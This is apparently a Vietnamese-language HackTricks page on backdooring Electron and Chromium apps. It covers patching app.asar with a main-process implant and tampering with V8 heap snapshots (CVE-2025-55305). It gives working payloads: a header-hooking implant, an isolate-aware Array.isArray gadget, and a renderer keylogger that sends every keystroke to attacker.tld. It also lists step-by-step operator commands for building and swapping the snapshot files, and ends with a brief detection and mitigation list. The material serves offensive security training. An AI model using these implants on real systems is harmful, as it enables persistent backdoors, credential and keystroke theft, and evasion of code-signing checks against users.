# Chèn mã cục bộ và giả mạo snapshot trong Electron

{{#include ../../banners/hacktricks-training.md}}

## Chèn mã cục bộ trong Electron

Nếu có thể sửa đổi hoặc instrument một ứng dụng Electron được cài đặt cục bộ, bạn có thể khiến ứng dụng thực thi JavaScript tùy ý. Xem:


{{#ref}}
../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-electron-applications-injection.md
{{#endref}}

Để tìm hiểu về bề mặt debug của Node inspector hoặc Chromium DevTools cục bộ, xem [Node inspector/CEF debug abuse](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md).

## Post-exploitation: cấy implant vào ASAR/main process

Nếu có **quyền ghi** vào thư mục resources của ứng dụng Electron, một kỹ thuật post-exploitation rất thiết thực là **vá `app.asar`** (hoặc JS entrypoint mà ứng dụng tải) rồi chờ người dùng khởi chạy lại ứng dụng. Khác với XSS chỉ tác động đến renderer, mã được tải từ **main process** sẽ chạy trong **Node.js runtime** của ứng dụng, vì vậy thường có thể truy cập **filesystem**, chạy lệnh, hook các Electron API và kiểm tra trạng thái ứng dụng đã xác thực.<sup>[[1]](#references)[[7]](#references)[[8]](#references)</sup>

Quy trình thường dùng:

1. Giải nén `app.asar` và xác định bootstrap file thực tế từ `package.json` (`main`) hoặc logic khởi động hiện có.
2. Thêm một loader nhỏ vào **main process** (hoặc một hook preload/main-process), rồi đóng gói lại archive.
3. Chờ ứng dụng khởi chạy lại và dùng implant để thu thập dữ liệu runtime sau khi người dùng mở khóa hoặc xác thực vào ứng dụng desktop.

Ví dụ bản vá bootstrap tối giản:

```javascript
// Added near the application main entrypoint
const cp = require("child_process")
const { session } = require("electron")

session.defaultSession.webRequest.onBeforeSendHeaders((details, callback) => {
  // Inspect or copy authenticated headers/tokens here
  callback({ requestHeaders: details.requestHeaders })
})

cp.exec("id")
```

Các tác động thực tế:

- **Đánh cắp dữ liệu từ client đáng tin cậy**: khi ứng dụng desktop giải mã hoặc tải dữ liệu cho người dùng, implant có thể đọc dữ liệu đó từ runtime. Đây là lý do **client nhắn tin E2EE** (Signal/Slack/Mattermost) và **vault/trình quản lý bí mật** vẫn là những mục tiêu đáng chú ý ở lớp endpoint.
- **Lạm dụng session/token**: implant Electron có thể đánh cắp cookie ứng dụng, bearer token, request header, file workspace hoặc thông tin xác thực repo mà client đang chạy để lộ (ví dụ: các extension VS Code đã xác thực hoặc tích hợp Git).
- **Pivot theo ngữ cảnh nạn nhân**: ứng dụng đã bị vá có thể proxy request thông qua máy trạm của nạn nhân, tái sử dụng IP, TLS fingerprint và session ứng dụng của nạn nhân thay vì chỉ exfiltrate token thô.

> [!NOTE]
> Nếu mục tiêu bật **ASAR integrity** / **OnlyLoadAppFromAsar** hoặc **fuse** Electron được harden, bạn có thể cần một primitive nạp code cục bộ khác (ví dụ: lạm dụng fuse hoặc can thiệp snapshot). Xem trang injection dành riêng cho macOS để biết thêm các tùy chọn implant cục bộ và chi tiết về fuse.

## Backdoor cục bộ bằng cách can thiệp V8 heap snapshot (Electron/Chromium) – CVE-2025-55305

Các ứng dụng dựa trên Electron và Chromium deserialize một V8 heap snapshot được tạo sẵn khi khởi động (v8_context_snapshot.bin và tùy chọn browser_v8_context_snapshot.bin) để khởi tạo từng V8 isolate (main, preload, renderer). Trước đây, integrity fuse của Electron không xem các snapshot này là nội dung thực thi, nên chúng không bị cơ chế thực thi integrity dựa trên fuse hay kiểm tra code-signing của hệ điều hành phát hiện. Do đó, thay snapshot trong thư mục cài đặt có thể ghi bởi người dùng cho phép thực thi code một cách kín đáo và bền vững bên trong ứng dụng mà không cần sửa các binary đã ký hoặc ASAR.<sup>[[2]](#references)</sup>

Các điểm chính
- Lỗ hổng integrity: EnableEmbeddedAsarIntegrityValidation và OnlyLoadAppFromAsar xác thực JavaScript của ứng dụng bên trong ASAR, nhưng không bao gồm V8 heap snapshot (CVE-2025-55305). Chromium cũng không kiểm tra integrity của snapshot.<sup>[[3]](#references)[[4]](#references)</sup>
- Điều kiện tiên quyết của cuộc tấn công: Ghi file cục bộ vào thư mục cài đặt ứng dụng. Điều này phổ biến trên các hệ thống cài ứng dụng Electron hoặc trình duyệt Chromium trong các đường dẫn mà người dùng có quyền ghi (ví dụ: %AppData%\Local trên Windows; /Applications trên macOS, tùy trường hợp).
- Tác động: Thực thi JavaScript của attacker đáng tin cậy trong mọi isolate bằng cách ghi đè một builtin thường được sử dụng (một “gadget”), cho phép duy trì quyền truy cập và né tránh xác minh code-signing.
- Bề mặt bị ảnh hưởng: Ứng dụng Electron (kể cả khi đã bật fuse) và trình duyệt dựa trên Chromium tải snapshot từ các vị trí mà người dùng có quyền ghi.

Tạo snapshot độc hại mà không cần build Chromium
- Dùng electron/mksnapshot dựng sẵn để biên dịch payload JS thành snapshot rồi ghi đè v8_context_snapshot.bin của ứng dụng.<sup>[[5]](#references)[[6]](#references)</sup>

Ví dụ payload tối giản (chứng minh thực thi bằng cách buộc ứng dụng crash)
```js
// Build snapshot from this payload
// npx -y electron-mksnapshot@37.2.6 "/abs/path/to/payload.js"
// Replace the application’s v8_context_snapshot.bin with the generated file

const orig = Array.isArray;

// Use Array.isArray as a ubiquitous gadget
Array.isArray = function () {
  // Executed whenever the app calls Array.isArray
  throw new Error("testing isArray gadget");
};
```

Định tuyến payload nhận biết isolate (chạy code khác nhau trong main và renderer)
- Nhận diện main process: Các global chỉ có trong Node như process.pid, process.binding() hoặc process.dlopen có mặt trong isolate của main process.
- Nhận diện browser/renderer: Các global chỉ có trong browser như alert khả dụng khi chạy trong ngữ cảnh document.

Ví dụ gadget thăm dò các khả năng Node của main process một lần
```js
const orig = Array.isArray;

Array.isArray = function() {
  // Defer until we land in main (has Node process)
  try {
    if (!process || !process.pid) {
      return orig(...arguments);
    }
  } catch (_) {
    return orig(...arguments);
  }

  // Run once
  if (!globalThis._invoke_lock) {
    globalThis._invoke_lock = true;
    console.log('[payload] isArray hook started ...');

    // Capability probing in main
    console.log(`[payload] unconstrained fetch available: [${fetch ? 'y' : 'n'}]`);
    console.log(`[payload] unconstrained fs available: [${process.binding('fs') ? 'y' : 'n'}]`);
    console.log(`[payload] unconstrained spawn available: [${process.binding('spawn_sync') ? 'y' : 'n'}]`);
    console.log(`[payload] unconstrained dlopen available: [${process.dlopen ? 'y' : 'n'}]`);
    process.exit(0);
  }
  return orig(...arguments);
};
```

PoC đánh cắp dữ liệu trong ngữ cảnh renderer/browser (ví dụ: Slack)
```js
const orig = Array.isArray;
Array.isArray = function() {
  // Wait for a browser context
  try {
    if (!alert) {
      return orig(...arguments);
    }
  } catch (_) {
    return orig(...arguments);
  }

  if (!globalThis._invoke_lock) {
    globalThis._invoke_lock = true;
    setInterval(() => {
      window.onkeydown = (e) => {
        fetch('http://attacker.tld/keylogger?q=' + encodeURIComponent(e.key), {mode: 'no-cors'})
      }
    }, 1000);
  }
  return orig(...arguments);
};
```

Quy trình của operator
1) Viết payload.js để ghi đè một builtin phổ biến (ví dụ: Array.isArray) và tùy chọn phân nhánh theo từng isolate.
2) Build snapshot mà không cần source Chromium:
   - npx -y electron-mksnapshot@37.2.6 "/abs/path/to/payload.js"
3) Ghi đè các file snapshot của ứng dụng mục tiêu:
   - v8_context_snapshot.bin (luôn được sử dụng)
   - browser_v8_context_snapshot.bin (nếu sử dụng fuse LoadBrowserProcessSpecificV8Snapshot)
4) Khởi chạy ứng dụng; gadget sẽ thực thi mỗi khi builtin đã chọn được sử dụng.

Lưu ý và cân nhắc
- Bypass kiểm tra tính toàn vẹn/chữ ký: Các file snapshot không được xem là executable native trong quá trình kiểm tra code-signing và (trong lịch sử) không được bảo vệ bởi fuses của Electron hoặc các cơ chế kiểm soát tính toàn vẹn của Chromium.
- Persistence: Thay snapshot trong thư mục cài đặt mà người dùng có quyền ghi thường sẽ tồn tại qua các lần khởi động lại ứng dụng và trông như một ứng dụng hợp pháp đã được ký.
- Trình duyệt Chromium: Cùng ý tưởng tampering này áp dụng cho Chrome/các phiên bản phái sinh được cài đặt ở vị trí mà người dùng có quyền ghi. Chrome có các biện pháp giảm thiểu tính toàn vẹn khác nhưng tuyên bố rõ rằng các cuộc tấn công thực hiện trực tiếp trên máy nằm ngoài threat model của họ.<sup>[[9]](#references)[[10]](#references)</sup>

Phát hiện và giảm thiểu
- Xem snapshot là nội dung có thể thực thi và đưa chúng vào quy trình thực thi kiểm tra tính toàn vẹn (bản sửa lỗi CVE-2025-55305).
- Ưu tiên cài đặt ở vị trí chỉ admin mới có quyền ghi; thiết lập baseline và giám sát hash của v8_context_snapshot.bin và browser_v8_context_snapshot.bin.
- Phát hiện việc ghi đè builtin trong early runtime và các thay đổi snapshot bất thường; cảnh báo khi snapshot được deserialize không khớp với giá trị dự kiến.

## References

- [1] [JS-Tap v3: Hậu khai thác endpoint bằng implant JavaScript](https://trustedsec.com/blog/js-tap-v3-endpoint-post-exploitation-with-javascript-implants)
- [2] [Vượt qua các kiểm tra tính toàn vẹn của code để cài backdoor cục bộ vào Signal, 1Password, Slack và nhiều ứng dụng khác](https://blog.trailofbits.com/2025/09/03/subverting-code-integrity-checks-to-locally-backdoor-signal-1password-slack-and-more/)
- [3] [Các fuse của Electron](https://www.electronjs.org/docs/latest/tutorial/fuses)
- [4] [Tính toàn vẹn của Electron ASAR](https://www.electronjs.org/docs/latest/tutorial/asar-integrity)
- [5] [Các startup snapshot tùy chỉnh của V8](https://v8.dev/blog/custom-startup-snapshots)
- [6] [electron/mksnapshot](https://github.com/electron/mksnapshot)
- [7] [MITRE ATT&CK T1218.015](https://attack.mitre.org/techniques/T1218/015/)
- [8] [Loki C2](https://github.com/boku7/Loki/)
- [9] [Chromium: Tắt tải code chưa được ký (CIG)](https://chromium.googlesource.com/chromium/src/+/refs/heads/lkgr/docs/design/sandbox.md#disable-loading-of-unsigned-code-cig)
- [10] [Câu hỏi thường gặp về bảo mật Chrome: các cuộc tấn công thực hiện trực tiếp trên máy nằm ngoài phạm vi](https://chromium.googlesource.com/chromium/src/+/HEAD/docs/security/faq.md#why-arent-physically_local-attacks-in-chromes-threat-model)
{{#include ../../banners/hacktricks-training.md}}
